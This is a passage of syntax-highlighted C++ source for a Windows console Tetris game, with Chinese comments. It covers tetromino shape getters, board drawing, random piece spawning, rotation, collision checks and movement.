class="comment">//========================================J</span></span><br><span class="line">	<span class="built_in">vector</span>&lt;point&gt; getJ1(point center)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">vector</span>&lt;point&gt; temp;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; J1.size(); ++i)</span><br><span class="line">		&#123;</span><br><span class="line">			temp.emplace_back(J1[i] + center);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> temp;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">vector</span>&lt;point&gt; getJ2(point center)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">vector</span>&lt;point&gt; temp;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; J2.size(); ++i)</span><br><span class="line">		&#123;</span><br><span class="line">			temp.emplace_back(J2[i] + center);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> temp;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">vector</span>&lt;point&gt; getJ3(point center)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">vector</span>&lt;point&gt; temp;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; J3.size(); ++i)</span><br><span class="line">		&#123;</span><br><span class="line">			temp.emplace_back(J3[i] + center);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> temp;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">vector</span>&lt;point&gt; getJ4(point center)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">vector</span>&lt;point&gt; temp;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; J4.size(); ++i)</span><br><span class="line">		&#123;</span><br><span class="line">			temp.emplace_back(J4[i] + center);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> temp;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//========================================I</span></span><br><span class="line">	<span class="built_in">vector</span>&lt;point&gt; getI1(point center)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">vector</span>&lt;point&gt; temp;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; I1.size(); ++i)</span><br><span class="line">		&#123;</span><br><span class="line">			temp.emplace_back(I1[i] + center);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> temp;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">vector</span>&lt;point&gt; getI2(point center)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">vector</span>&lt;point&gt; temp;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; I2.size(); ++i)</span><br><span class="line">		&#123;</span><br><span class="line">			temp.emplace_back(I2[i] + center);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> temp;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//========================================O</span></span><br><span class="line">	<span class="built_in">vector</span>&lt;point&gt; getO1(point center)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">vector</span>&lt;point&gt; temp;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; O1.size(); ++i)</span><br><span class="line">		&#123;</span><br><span class="line">			temp.emplace_back(O1[i] + center);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> temp;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//========================================T</span></span><br><span class="line">	<span class="built_in">vector</span>&lt;point&gt; getT1(point center)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">vector</span>&lt;point&gt; temp;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; T1.size(); ++i)</span><br><span class="line">		&#123;</span><br><span class="line">			temp.emplace_back(T1[i] + center);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> temp;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">vector</span>&lt;point&gt; getT2(point center)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">vector</span>&lt;point&gt; temp;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; T2.size(); ++i)</span><br><span class="line">		&#123;</span><br><span class="line">			temp.emplace_back(T2[i] + center);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> temp;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">vector</span>&lt;point&gt; getT3(point center)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">vector</span>&lt;point&gt; temp;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; T3.size(); ++i)</span><br><span class="line">		&#123;</span><br><span class="line">			temp.emplace_back(T3[i] + center);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> temp;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">vector</span>&lt;point&gt; getT4(point center)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">vector</span>&lt;point&gt; temp;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; T4.size(); ++i)</span><br><span class="line">		&#123;</span><br><span class="line">			temp.emplace_back(T4[i] + center);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> temp;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myTetris</span> :</span><span class="keyword">private</span> myScreen, <span class="keyword">private</span> myTetrisBlocks</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; fixedBlock; <span class="comment">//int值为0表示没有方块, 非0的int值表示颜色, </span></span><br><span class="line">	<span class="built_in">vector</span>&lt;point&gt; movingBlock;</span><br><span class="line">	point movingCenter;</span><br><span class="line">	default_random_engine e;</span><br><span class="line">	<span class="keyword">int</span> movingType;</span><br><span class="line">	<span class="keyword">int</span> score = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> currColor;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">setColor</span><span class="params">(<span class="keyword">int</span> color)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		currColor = color;</span><br><span class="line">		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), color);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="keyword">bool</span> isDead = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">	myTetris()</span><br><span class="line">	&#123;</span><br><span class="line">		e.seed(<span class="keyword">static_cast</span>&lt;<span class="keyword">unsigned</span> <span class="keyword">int</span>&gt;(time(<span class="number">0</span>)));<span class="comment">//将时间作为随机数生成器种子</span></span><br><span class="line"></span><br><span class="line">		<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; temp(HIGHT, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; WIDTH; ++i) <span class="comment">//初始化容器大小</span></span><br><span class="line">		&#123;</span><br><span class="line">			fixedBlock.push_back(temp);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="built_in">string</span> commond;</span><br><span class="line">		commond = <span class="string">"mode con cols="</span> + to_string(WIDTH * <span class="number">2</span> + <span class="number">4</span>) + <span class="string">" lines="</span> + to_string(HIGHT + <span class="number">6</span>); <span class="comment">//调整窗口大小</span></span><br><span class="line">		system(commond.c_str());</span><br><span class="line">		system(<span class="string">"cls"</span>);<span class="comment">//清屏</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; WIDTH + <span class="number">2</span>; ++i) <span class="comment">//生成顶部,有边缘的原因, 所以额外+4</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (i == <span class="number">0</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				print(i, <span class="number">0</span>, <span class="string">"┌"</span>);</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (i == WIDTH + <span class="number">1</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				print(i, <span class="number">0</span>, <span class="string">"┐"</span>);</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			print(i, <span class="number">0</span>, <span class="string">"─"</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; WIDTH + <span class="number">2</span>; ++i) <span class="comment">//生成底部,有边缘的原因, 所以额外+4</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (i == <span class="number">0</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				print(i, HIGHT + <span class="number">1</span>, <span class="string">"└"</span>);</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (i == WIDTH + <span class="number">1</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				print(i, HIGHT + <span class="number">1</span>, <span class="string">"┘"</span>);</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			print(i, HIGHT + <span class="number">1</span>, <span class="string">"─"</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; HIGHT + <span class="number">1</span>; ++i) <span class="comment">//生成左右边框</span></span><br><span class="line">		&#123;</span><br><span class="line">			print(<span class="number">0</span>, i, <span class="string">"│"</span>);</span><br><span class="line">			print(WIDTH + <span class="number">1</span>, i, <span class="string">"│"</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		print(WIDTH / <span class="number">2</span> - <span class="number">5</span>, HIGHT + <span class="number">2</span>, <span class="string">"俄罗斯方块  得分: 0"</span>); <span class="comment">//标题</span></span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">newBlock</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		movingBlock.clear();</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">static</span> <span class="built_in">std</span>::uniform_int_distribution&lt;<span class="keyword">unsigned</span> <span class="keyword">int</span>&gt; b(<span class="number">1</span>, <span class="number">19</span>);</span><br><span class="line">		<span class="keyword">static</span> <span class="built_in">std</span>::uniform_int_distribution&lt;<span class="keyword">unsigned</span> <span class="keyword">int</span>&gt; c(<span class="number">1</span>, <span class="number">7</span>);</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">int</span> randNum = b(e);</span><br><span class="line">		setColor(c(e)); <span class="comment">//生成颜色随机的方块</span></span><br><span class="line"></span><br><span class="line">		movingCenter = point(WIDTH / <span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line">		<span class="keyword">switch</span> (randNum)</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">			movingBlock = getS1(movingCenter);</span><br><span class="line">			movingType = <span class="number">1</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">			movingBlock = getS2(movingCenter);</span><br><span class="line">			movingType = <span class="number">2</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">			movingBlock = getZ1(movingCenter);</span><br><span class="line">			movingType = <span class="number">3</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">			movingBlock = getZ2(movingCenter);</span><br><span class="line">			movingType = <span class="number">4</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">			movingBlock = getL1(movingCenter);</span><br><span class="line">			movingType = <span class="number">5</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">			movingBlock = getL2(movingCenter);</span><br><span class="line">			movingType = <span class="number">6</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">			movingBlock = getL3(movingCenter);</span><br><span class="line">			movingType = <span class="number">7</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">			movingBlock = getL4(movingCenter);</span><br><span class="line">			movingType = <span class="number">8</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">			movingBlock = getJ1(movingCenter);</span><br><span class="line">			movingType = <span class="number">9</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">			movingBlock = getJ2(movingCenter);</span><br><span class="line">			movingType = <span class="number">10</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">			movingBlock = getJ3(movingCenter);</span><br><span class="line">			movingType = <span class="number">11</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">			movingBlock = getJ4(movingCenter);</span><br><span class="line">			movingType = <span class="number">12</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="number">13</span>:</span><br><span class="line">			movingBlock = getI1(movingCenter);</span><br><span class="line">			movingType = <span class="number">13</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="number">14</span>:</span><br><span class="line">			movingBlock = getI2(movingCenter);</span><br><span class="line">			movingType = <span class="number">14</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="number">15</span>:</span><br><span class="line">			movingBlock = getO1(movingCenter);</span><br><span class="line">			movingType = <span class="number">15</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="number">16</span>:</span><br><span class="line">			movingBlock = getT1(movingCenter);</span><br><span class="line">			movingType = <span class="number">16</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="number">17</span>:</span><br><span class="line">			movingBlock = getT2(movingCenter);</span><br><span class="line">			movingType = <span class="number">17</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="number">18</span>:</span><br><span class="line">			movingBlock = getT3(movingCenter);</span><br><span class="line">			movingType = <span class="number">18</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="number">19</span>:</span><br><span class="line">			movingBlock = getT4(movingCenter);</span><br><span class="line">			movingType = <span class="number">19</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!checkBlock(movingBlock))<span class="comment">//检查新生成的方块是否与固定方块重叠</span></span><br><span class="line">		&#123;</span><br><span class="line">			isDead = <span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		printVector(movingBlock, dot);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">bool</span> <span class="title">checkBlock</span><span class="params">(<span class="built_in">vector</span>&lt;point&gt; &amp;temp)</span> <span class="comment">//检查方块是否越界或者会与已有方块重叠</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i&lt;temp.size(); ++i)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (temp[i].y &gt; HIGHT || temp[i].x &gt; WIDTH || temp[i].x &lt;= <span class="number">0</span> || fixedBlock[temp[i].x - <span class="number">1</span>][temp[i].y - <span class="number">1</span>] != <span class="number">0</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">rotate</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		printVector(movingBlock, blank);</span><br><span class="line">		<span class="built_in">vector</span>&lt;point&gt; temp;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">switch</span> (movingType)</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">			temp = getS2(movingCenter);</span><br><span class="line">			<span class="keyword">if</span> (checkBlock(temp))</span><br><span class="line">			&#123;</span><br><span class="line">				movingBlock = temp;</span><br><span class="line">				movingType = <span class="number">2</span>;</span><br><span class="line">			&#125;		</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">			temp = getS1(movingCenter);</span><br><span class="line">			<span class="keyword">if</span> (checkBlock(temp))</span><br><span class="line">			&#123;</span><br><span class="line">				movingBlock = temp;</span><br><span class="line">				movingType = <span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">			temp = getZ2(movingCenter);</span><br><span class="line">			<span class="keyword">if</span> (checkBlock(temp))</span><br><span class="line">			&#123;</span><br><span class="line">				movingBlock = temp;</span><br><span class="line">				movingType = <span class="number">4</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">			temp = getZ1(movingCenter);</span><br><span class="line">			<span class="keyword">if</span> (checkBlock(temp))</span><br><span class="line">			&#123;</span><br><span class="line">				movingBlock = temp;</span><br><span class="line">				movingType = <span class="number">3</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">			temp = getL2(movingCenter);</span><br><span class="line">			<span class="keyword">if</span> (checkBlock(temp))</span><br><span class="line">			&#123;</span><br><span class="line">				movingBlock = temp;</span><br><span class="line">				movingType = <span class="number">6</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">			temp = getL3(movingCenter);</span><br><span class="line">			<span class="keyword">if</span> (checkBlock(temp))</span><br><span class="line">			&#123;</span><br><span class="line">				movingBlock = temp;</span><br><span class="line">				movingType = <span class="number">7</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">			temp = getL4(movingCenter);</span><br><span class="line">			<span class="keyword">if</span> (checkBlock(temp))</span><br><span class="line">			&#123;</span><br><span class="line">				movingBlock = temp;</span><br><span class="line">				movingType = <span class="number">8</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">			temp = getL1(movingCenter);</span><br><span class="line">			<span class="keyword">if</span> (checkBlock(temp))</span><br><span class="line">			&#123;</span><br><span class="line">				movingBlock = temp;</span><br><span class="line">				movingType = <span class="number">5</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">			temp = getJ2(movingCenter);</span><br><span class="line">			<span class="keyword">if</span> (checkBlock(temp))</span><br><span class="line">			&#123;</span><br><span class="line">				movingBlock = temp;</span><br><span class="line">				movingType = <span class="number">10</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">			temp = getJ3(movingCenter);</span><br><span class="line">			<span class="keyword">if</span> (checkBlock(temp))</span><br><span class="line">			&#123;</span><br><span class="line">				movingBlock = temp;</span><br><span class="line">				movingType = <span class="number">11</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">			temp = getJ4(movingCenter);</span><br><span class="line">			<span class="keyword">if</span> (checkBlock(temp))</span><br><span class="line">			&#123;</span><br><span class="line">				movingBlock = temp;</span><br><span class="line">				movingType = <span class="number">12</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">			temp = getJ1(movingCenter);</span><br><span class="line">			<span class="keyword">if</span> (checkBlock(temp))</span><br><span class="line">			&#123;</span><br><span class="line">				movingBlock = temp;</span><br><span class="line">				movingType = <span class="number">9</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="number">13</span>:</span><br><span class="line">			temp = getI2(movingCenter);</span><br><span class="line">			<span class="keyword">if</span> (checkBlock(temp))</span><br><span class="line">			&#123;</span><br><span class="line">				movingBlock = temp;</span><br><span class="line">				movingType = <span class="number">14</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="number">14</span>:</span><br><span class="line">			temp = getI1(movingCenter);</span><br><span class="line">			<span class="keyword">if</span> (checkBlock(temp))</span><br><span class="line">			&#123;</span><br><span class="line">				movingBlock = temp;</span><br><span class="line">				movingType = <span class="number">13</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="number">15</span>:</span><br><span class="line">			<span class="comment">//15是方块, 跳过 </span></span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="number">16</span>:</span><br><span class="line">			temp = getT2(movingCenter);</span><br><span class="line">			<span class="keyword">if</span> (checkBlock(temp))</span><br><span class="line">			&#123;</span><br><span class="line">				movingBlock = temp;</span><br><span class="line">				movingType = <span class="number">17</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="number">17</span>:</span><br><span class="line">			temp = getT3(movingCenter);</span><br><span class="line">			<span class="keyword">if</span> (checkBlock(temp))</span><br><span class="line">			&#123;</span><br><span class="line">				movingBlock = temp;</span><br><span class="line">				movingType = <span class="number">18</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="number">18</span>:</span><br><span class="line">			temp = getT4(movingCenter);</span><br><span class="line">			<span class="keyword">if</span> (checkBlock(temp))</span><br><span class="line">			&#123;</span><br><span class="line">				movingBlock = temp;</span><br><span class="line">				movingType = <span class="number">19</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="number">19</span>:</span><br><span class="line">			temp = getT1(movingCenter);</span><br><span class="line">			<span class="keyword">if</span> (checkBlock(temp))</span><br><span class="line">			&#123;</span><br><span class="line">				movingBlock = temp;</span><br><span class="line">				movingType = <span class="number">16</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		printVector(movingBlock, dot);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">bool</span> <span class="title">moveDawn</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">bool</span> touchDown = <span class="literal">false</span>;</span><br><span class="line">		printVector(movingBlock, blank); <span class="comment">//将上次的图像清空</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; movingBlock.size(); ++i)</span><br><span class="line">		&#123;</span><br><span class="line">			movingBlock[i].y += <span class="number">1</span>; <span class="comment">//向下移一位</span></span><br><span class="line">			<span class="keyword">if</span> (movingBlock[i].y &gt; HIGHT || fixedBlock[movingBlock[i].x - <span class="number">1</span>][movingBlock[i].y - <span class="number">1</span>] != <span class="number">0</span>) <span class="comment">//检查是否碰到底部或者碰到固定的方块</span></span><br><span class="line">			&#123;				</span><br><span class="line">				touchDown = <span class="literal">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> (touchDown)</span><br><span class="line">		&#123;	</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; movingBlock.size(); ++i)</span><br><span class="line">			&#123;			</span><br><span class="line">				movingBlock[i].y -= <span class="number">1</span>; <span class="comment">//如果碰到了其他的方块, 退回一位</span></span><br><span class="line">				fixedBlock[movingBlock[i].x - <span class="number">1</span>][movingBlock[i].y - <span class="number">1</span>] = currColor; <span class="comment">//录入到固定方块的容器中去		</span></span><br><span class="line">			&#125;</span><br><span class="line">			printVector(movingBlock, dot); <span class="comment">//输出这次的图像</span></span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			movingCenter.y += <span class="number">1</span>;</span><br><span class="line">			printVector(movingBlock, dot); <span class="comment">//输出这次的图像</span></span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;		</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">moveLeft</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">bool</span> touchLeft = <span class="literal">false</span>;</span><br><span class="line">		printVector(movingBlock, blank);	</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; movingBlock.size(); ++i)</span><br><span class="line">		&#123;</span><br><span class="line">			movingBlock[i].x -= <span class="number">1</span>; <span class="comment">//向左移一位</span></span><br><span class="line">			<span class="keyword">if</span> (movingBlock[i].x &lt;= <span class="number">0</span> || fixedBlock[movingBlock[i].x - <span class="number">1</span>][movingBlock[i].y - <span class="number">1</span>] != <span class="number">0</span>) <span class="comment">//检查是否碰到左边界或者碰到固定的方块</span></span><br><span class="line">			&#123;</span><br><span class="line">				touchLeft = <span class="literal">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (touchLeft)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; movingBlock.size(); ++i)</span><br><span class="line">			&#123;</span><br><span class="line">				movingBlock[i].x += <span class="number">1</span>; <span 